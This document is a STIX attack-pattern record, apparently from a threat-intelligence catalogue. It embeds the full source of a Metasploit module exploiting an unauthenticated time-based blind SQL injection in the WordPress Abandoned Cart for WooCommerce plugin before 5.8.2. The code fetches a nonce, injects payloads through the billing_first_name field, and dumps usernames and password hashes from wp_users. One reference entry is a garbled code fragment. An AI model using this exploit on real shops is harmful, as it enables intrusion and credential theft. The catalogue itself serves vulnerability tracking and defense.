{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c9608b6-cd8d-4ea8-b12d-eae9edcdfd47",
    "created": "2024-08-14T16:28:36.990752Z",
    "modified": "2024-08-14T16:28:36.990756Z",
    "name": "Abandoned Cart for WooCommerce SQLi Scanner",
    "description": " Abandoned Cart, a plugin for WordPress which extends the WooCommerce plugin prior to 5.8.2 is affected by an unauthenticated SQL injection via the billing_first_name parameter of the save_data AJAX call.  A valid wp_woocommerce_session cookie is required, which has at least one item in the cart. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_abandoned_cart_sqli.rb",
            "external_id": "wp_abandoned_cart_sqli.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10461"
        },
        {
            "source_name": "reference",
            "url": "https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2413885"
        },
        {
            "source_name": "uri=>normalize_uri(target_uri.path",
            "external_id": "datastoreCHECKOUTURL)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Abandoned Cart for WooCommerce SQLi Scanner',\n        'Description' => %q{\n          Abandoned Cart, a plugin for WordPress which extends the WooCommerce plugin,\n          prior to 5.8.2 is affected by an unauthenticated SQL injection via the\n          billing_first_name parameter of the save_data AJAX call.  A valid\n          wp_woocommerce_session cookie is required, which has at least one item in the\n          cart.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'WPDeeply', # Discovery and PoC\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['WPVDB', '10461'],\n          ['URL', 'https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/'],\n          ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2020-11-05'\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1]),\n      OptString.new('CHECKOUTURL', [true, 'Checkout URL', '/index.php/checkout/']),\n      OptString.new('COOKIE', [true, 'Cookie with an item in the shopping cart. Must contain wp_woocommerce_session', ''])\n    ]\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      vprint_error('Server not online or not detected as wordpress')\n      return\n    end\n\n    checkcode = check_plugin_version_from_readme('woocommerce-abandoned-cart', '5.8.2')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      vprint_error('Abandoned Cart for WooCommerce version not vulnerable')\n      return\n    end\n    print_good('Vulnerable version of Abandoned Cart for WooCommerce detected')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, datastore['CHECKOUTURL']),\n      'cookie' => datastore['COOKIE']\n    })\n\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n\n    unless res.body =~ /name=\"wcal_guest_capture_nonce\" value=\"([^\"]*)\"/\n      print_error('Unable to find wcal_guest_capture_nonce')\n      return\n    end\n    nonce = Regexp.last_match[1]\n    print_status(\"Nonce: #{nonce}\")\n\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|\n      # required or you get values like <> for username and *)/?*//-?//>/?=)+ for password hash\n      if payload.include?('<')\n        payload.gsub!(/<>/, '=')\n        payload.gsub!(/(sleep\\(\\d+\\.?\\d*\\)),0/) { \"0,#{Regexp.last_match(1)}\" }\n      end\n\n      res = send_request_cgi({\n        'method' => 'POST',\n        'cookie' => datastore['COOKIE'],\n        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n        'vars_post' => {\n          'billing_first_name' => \"#{Rex::Text.rand_text_alpha_lower(6)}','','','','',( TRUE AND #{payload})) -- #{Rex::Text.rand_text_alpha_lower(1)}\",\n          'billing_last_name' => Rex::Text.rand_surname,\n          'billing_company' => '',\n          'billing_address_1' => Rex::Text.rand_text_alpha(8),\n          'billing_address_2' => '',\n          'billing_city' => Rex::Text.rand_text_alpha(6),\n          'billing_state' => Rex::Text.rand_state,\n          'billing_postcode' => Rex::Text.rand_text_numeric(6),\n          'billing_country' => Rex::Text.rand_country,\n          'billing_phone' => Rex::Text.rand_text_numeric(9),\n          'billing_email' => \"#{Rex::Text.rand_surname}@#{Rex::Text.rand_text_alpha_lower(6)}.com\",\n          'order_notes' => '',\n          'wcal_guest_capture_nonce' => nonce,\n          'action' => 'save_data'\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n    columns = ['user_login', 'user_pass']\n\n    print_status('Enumerating Usernames and Password Hashes')\n    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    data.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-11-05"
}